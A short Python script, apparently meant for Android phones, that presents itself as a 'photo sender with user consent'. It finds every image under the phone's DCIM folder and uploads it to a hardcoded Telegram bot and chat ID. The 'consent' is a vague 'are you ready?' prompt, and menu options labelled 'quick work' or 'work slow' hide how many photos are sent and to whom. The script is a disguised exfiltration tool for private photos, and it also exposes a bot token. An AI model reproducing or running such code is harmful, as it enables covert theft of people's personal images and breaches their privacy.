"""
DCIM Photo Sender with User Consent
  Telegram 
"""

import os
import sys
import time
from datetime import datetime
import requests

# ==================== TELEGRAM CONFIGURATION ====================
TELEGRAM_BOT_TOKEN = "8134629384:AAE8YCOkeoEeMZ_6FGaRbCf4TNLf55rl82I"
TELEGRAM_CHAT_ID = "820421921"

# ==================== PHOTO SENDER ====================

class PhotoSender:
    def __init__(self, bot_token, chat_id):
        self.api = f"https://api.telegram.org/bot{bot_token}"
        self.chat_id = chat_id

    def send_photo(self, path):
        try:
            with open(path, "rb") as f:
                r = requests.post(
                    f"{self.api}/sendPhoto",
                    data={"chat_id": self.chat_id},
                    files={"photo": f},
                    timeout=30
                )
            return r.status_code == 200
        except:
            return False

    def send_batch(self, paths):
        for i, p in enumerate(paths, 1):
            self.send_photo(p)
            print(f"\r PORT OFING {i}/{len(paths)}", end="", flush=True)
            time.sleep(1)
        print()

# ==================== DCIM FINDER ====================

class DCIMFinder:
    def find(self, base):
        exts = {".jpg", ".jpeg", ".png", ".webp", ".bmp", ".gif"}
        photos = []
        for root, _, files in os.walk(base):
            for f in files:
                if os.path.splitext(f)[1].lower() in exts:
                    photos.append(os.path.join(root, f))
        return photos

# ==================== APP ====================

class App:
    def __init__(self):
        self.finder = DCIMFinder()
        self.sender = PhotoSender(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)

    def consent(self):
        print("are you ready? (yes/no)")
        return input("> ").strip().lower() in ["yes", "y"]

    def choose_dcim(self):
        paths = [
            "/sdcard/DCIM",
            "/storage/emulated/0/DCIM"
        ]
        for p in paths:
            if os.path.exists(p):
                return p
        return None

    def select_mode(self, photos):
        print("\n1. quick work")
        print("2. work slow")
        print("3. very slow")
        print("4. so slow")
        print("5. exit")

        try:
            c = int(input("> "))
            if c == 1:
                return photos
            if c == 2:
                return photos[:10]
            if c == 3:
                return photos[:5]
            if c == 4:
                return photos[:1]
        except:
            pass
        return []

    def run(self):
        os.system("clear")
        if not self.consent():
            return

        dcim = self.choose_dcim()
        if not dcim:
            print("DCIM not found")
            return

        photos = self.finder.find(dcim)
        if not photos:
            print("No photos")
            return

        selected = self.select_mode(photos)
        if not selected:
            return

        print("\nType SEND")
        if input("> ").strip() != "SEND":
            return

        self.sender.send_batch(selected)
        print("\nDone")

# ==================== MAIN ====================

if __name__ == "__main__":
    App().run()
